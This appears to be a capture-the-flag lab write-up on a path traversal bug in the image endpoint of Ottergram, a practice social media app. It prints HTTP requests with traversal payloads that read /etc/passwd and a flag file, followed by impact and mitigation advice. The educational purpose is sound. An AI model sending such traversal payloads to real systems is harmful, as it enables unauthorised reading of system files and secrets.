---
title: "File Inclusion – Arbitrary File Read via Image Endpoint | Ottergram"
date: 2026-04-25 21:52:00 +0530
categories: [Web Security, Local File Inclusion]
tags: [file-inclusion, lfi, path-traversal, arbitrary-file-read, bugforge, express]
platform: BugForge
author: Shivansh Sharma
image:
  path: /assets/images/posts/file-inclusion-bugforge.webp
  alt: File Inclusion vulnerability in Ottergram
---

## Overview
Ottergram is a prototype social media web application similar to Instagram, featuring account registration, post creation, and image uploads. While exploring the application's functionality, a vulnerability was discovered in the image retrieval endpoint that allowed arbitrary file access on the server.

## Objective
Identify and exploit a file handling vulnerability to read sensitive files from the server and retrieve the flag.

## Reconnaissance
After registering an account and interacting with the application, the image viewing functionality revealed the following request:

```http
GET /api/post/image?file=/uploads/otter2.png HTTP/2
Host: lab-1777152942329-hml68u.labs-app.bugforge.io
```

The `file` parameter directly referenced a server-side file path, which indicated a potential file inclusion or path traversal vulnerability.

## Exploitation
To test for path traversal, the `file` parameter was modified to access sensitive system files:

```http
GET /api/post/image?file=../../../../../etc/passwd HTTP/2
Host: lab-1777152942329-hml68u.labs-app.bugforge.io
```

## Result
The server responded with:

```http
HTTP/2 200 OK
```

This confirmed that the application did not properly validate or sanitize user input, allowing directory traversal and arbitrary file reading.

## Proof of Exploitation
Further enumeration led to discovering the flag file using path traversal:

```http
GET /api/post/image?file=/../flag.txt HTTP/2
Host: lab-1777152942329-hml68u.labs-app.bugforge.io
```

### Response

```http
HTTP/2 200 OK

bug{uFiWA5UCOKwoye0RMj4FG2K9YHXsfYU8}
```

## Impact
This vulnerability allows attackers to:

* Read sensitive system files (e.g., `/etc/passwd`)
* Access application source code
* Retrieve configuration files and secrets
* Potentially escalate to further attacks (e.g., RCE depending on environment)

In real-world scenarios, this could lead to full system compromise.

## Mitigation
To prevent such vulnerabilities:

* Validate and sanitize all user inputs
* Restrict file access to a specific directory (whitelisting)
* Use secure file handling mechanisms
* Avoid directly passing user input into file system functions
* Implement proper access controls
* Use libraries that normalize and validate file paths

## Real-World Insight
File inclusion vulnerabilities are still common in modern web applications, especially in poorly implemented file handling features. Attackers often chain LFI with other vulnerabilities like log poisoning or file upload flaws to achieve remote code execution.

Proper input validation and strict file access controls are critical to securing applications against such attacks.